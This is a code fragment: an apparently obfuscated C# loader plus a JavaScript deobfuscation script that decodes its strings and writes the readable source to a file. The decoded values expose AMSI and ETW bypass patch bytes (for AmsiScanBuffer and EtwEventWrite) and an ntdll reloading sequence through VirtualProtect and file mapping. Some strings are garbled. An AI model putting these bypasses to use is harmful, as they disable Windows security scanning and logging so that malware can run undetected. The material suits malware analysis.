...
public static void Main()
        {
            ...
            smethod_0("￳￿\\u0005￻￀￶￾￾",
                "札杙束杕朿杏杍杚朮条杒杒村杞",
                Convert.FromBase64String("䀅㿖㿳㿑㿒㿄㿔㿔"),
...
const smart = [
  "啒啌啙啕啌啓唚唙唕啋啓啓:kernel32.dll",
  "铠锉锌锐锂铥链锋锁锉锂:CloseHandle",
  "榁楻榈榄楻概楉楈楄楺概概:kernel32.dll",
  "땨떔떇떇땮떋떄떔떃떔떛:FreeLibrary",
  ":kernel32.dll",
  "��������������:VirtualProtect",
  "綾綸緅緁綸綿綆綅綁綷綿綿:kernel32.dll",
  "멼몫몞몚몭몞멿몢몥몞멺:CreateFileA",
  "涴涮涻涷涮涵浼浻海涭涵涵:kernel32.dll",
  "秹稨稛稗稪稛秼稟稢稛稃稗稦稦稟稤稝秷:CreateFileMappingA",
  "ﮠﮚﮧﮣﮚﮡﭨﭧﭣﮙﮡﮡ:kernel32.dll",
  "蛛蛯蛾蛤蛷蛳蜅蛝蛴蛔蛷蛺蛳:MapViewOfFile",
  ":msvcrt.dll",
  "뷅붽뷅붻뷈뷑:memcpy",
  "즈즋쥹즈즁쥆쥼즄즄:psapi.dll",
  ":GetModuleInformation",
  "”‗․†‗„ῥῤῠ‖„„:kernel32.dll",
  "ꃄꃮꃒꃪꃲꂱꂯꃋꃭꃪꃞꃠꃮꃮ:IsWow64Process",
  "䢸䢾䢮䢶䢶䡸䢮䢶䢶:ntdll.dll",
  "╥╟╬╨╟╦┭┬┨╞╦╦:kernel32.dll",
  "￳￿￻￀￶￾￾:amsi.dll",
  "札杙束杕朿杏杍杚朮条杒杒村杞:AmsiScanBuffer",
  "䀅㿖㿳㿑㿒㿄㿔㿔:uFcAB4DD",
  "⧝⦮⧋⦩⦪⦜⦬⦫⦯⦩⦩⦥:uFcAB4DCGAA=",
  ":ntdll.dll",
  "􈰒�􈰔���􍐐���:EtwEventWrite",
  "⑂⑂␈␈:ww==",
  "僬僝僆傶:whQA",
  "ꪺꪱ꫓꫎ꫠꫥꫛꫦꫮꫪ꫓꫊꫰ꫪꫫꫜꫤꪪꪩ꫓:C:\\\\Windows\\\\System32\\\\",
  "큫큢킄큿킑킖킌킗킟킛킄큻킡킛큿큷큿큞큜킄:C:\\\\Windows\\\\SysWOW64\\\\",
];

const target = smart.map((i) => i.slice(i.indexOf(":") + 1)),
  searcher = smart.reduce((l, i, o) => {
    const r = l.toString().replace(i.slice(0, i.indexOf(":")), target[o]);
    console.log(i, target[o]);
    return r;
  }, s);

console.log(target);

require("fs").writeFile("a.cs", searcher, () => {});
